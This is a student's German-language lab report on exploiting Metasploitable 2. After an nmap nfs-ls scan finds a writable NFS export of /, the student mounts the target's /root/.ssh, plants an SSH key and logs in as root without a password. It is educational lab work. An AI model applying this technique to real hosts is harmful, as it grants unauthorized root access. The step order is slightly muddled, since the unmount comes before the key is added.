| Kategorie | Beschreibung |
| --------- | --------- |
| Name      | Jonas Wolfbauer |
| Klasse    | 4AHITS |
| Fach      | ITSE |
| Thema     | portmapper/nfs vulnerability |
| Datum     | 09.03.2026 |

# Übung (ssh auf Metasploitable)

## Setup passwordless SSH
Um passwordless SSh zu ermöglich, muss der Public Key von kali-Linux auf der metasploitable2-VM hinzugefügt werden.

Da metasploitable2 nur alte RSA Keys akzeptiert, habe ich auf Kali ein neues Paar generiert.

**Key generieren**
```bash
ssh-keygen -t rsa
```

**Key hinzufügen**
```bash
sh-copy-id -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.1.51
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/root/.ssh/id_rsa.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
msfadmin@192.168.1.51's password:

Number of key(s) added: 1

Now try logging into the machine, with: "ssh -o 'HostKeyAlgorithms=+ssh-rsa' -o 'PubkeyAcceptedAlgorithms=+ssh-rsa' 'msfadmin@192.168.1.51'"
and check to make sure that only the key(s) you wanted were added
```

Die letzte Meldung gibt an, dass eine SSH-Verbindung über ``ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.1.51`` stattfinden soll.

Damit ist nun ein passwordless Login möglich!

# Übung (portmapper/nfs)

## Kleiner Überblick
``nfs`` steht für **N**etwork **F**ile **S**ystem und ist ein von Sun Microsystems entwickeltes Protokoll für Zugriff auf Daten über ein Netzwerk.
Diese Daten wirken so, als wären sie lokal gespeichert und können dementsprechend auch "normal" bearbeitet werden.

``portmapper`` dient für ``nfs`` als eine Art Vermittlungsstelle / Mittelmann. Dieser verknüpft beispielsweise RPC (Remote Procedure Call) Dienste von ``nfs`` mit den Ports auf dem die Dienste aktuell lauschen.

``portmapper`` ist für die alten ``nfs`` Versionen daher ein wichtiges Tool, aber auch ein Sicherheitsrisiko, da es Informationen aller laufenden RPC Dienste auf dem System preisgibt.

## nmap
Es gibt ein ``nmap``-Skript für nfs Schwachstellen. Der Command dafür lautet:

```bash
nmap -p 111 --script=nfs-ls <target>
``` 

Der Command liefert viele Informationen:
```bash
┌──(root㉿kali)-[~]
└─# nmap -p 111 --script=nfs-ls 192.168.1.51
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 07:50 -0400
Nmap scan report for 192.168.1.51
Host is up (0.00050s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /
|   access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION  UID  GID  SIZE   TIME                 FILENAME
| drwxr-xr-x  0    0    4096   2012-05-14T03:35:33  bin
| drwxr-xr-x  0    0    4096   2010-04-16T06:16:02  home
| drwxr-xr-x  0    0    4096   2010-03-16T22:57:40  initrd
| lrwxrwxrwx  0    0    32     2010-04-28T20:26:18  initrd.img
| drwxr-xr-x  0    0    4096   2012-05-14T03:35:22  lib
| drwx------  0    0    16384  2010-03-16T22:55:15  lost+found
| drwxr-xr-x  0    0    4096   2010-03-16T22:55:52  media
| drwxr-xr-x  0    0    4096   2010-04-28T20:16:56  mnt
| drwxr-xr-x  0    0    4096   2012-05-14T01:54:53  sbin
| drwxr-xr-x  0    0    4096   2010-04-28T04:06:37  usr
|_
MAC Address: 00:0C:29:30:11:49 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
```

Ausschlaggebend sind die weitreichenden Rechte und die Dateien die nfs "einfach so" veröffentlicht.  
``extend`` ermöglich es neue Dateien hinzuzufügen bzw. Ordner.

### Vorgehen

1. Zuerst muss ein mount-point erstellt werden. (``/mnt/``)  
```bash
mkdir -p /mnt/260309_portmapper/

```
2. Dann kann nfs gemounted werden  

```bash
# Genereller Command
sudo mount -t <Filesystem> <Target>:<Path> <mount-path>

# Finaler Command
sudo mount -t nfs 192.168.1.51:/root/.ssh/ /mnt/260309_portmapper
```

> Anmerkung  
``-t`` gibt den Filesystem-Typ an
3. Entmounten erfolgt mit  

```bash
# Genereller Command
sudo umount <mount-path>

# Finaler Command
sudo umount /mnt/260309_portmapper
```
4. Nun kann der gewünschte public-Key in der ``authorized_keys`` Datei hinzugefügt werden.

```bash
┌──(root㉿kali)-[~]
└─# ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.1.51
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Mon Mar  9 06:44:05 2026 from :0.0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@metasploitable:~# 
```

Passwordless SSH-Root Login funktioniert!

# Hilfreiche Quellen
- [nfs-ls NSE script](https://nmap.org/nsedoc/scripts/nfs-ls.html)
- [Google AI Overview](https://www.google.com)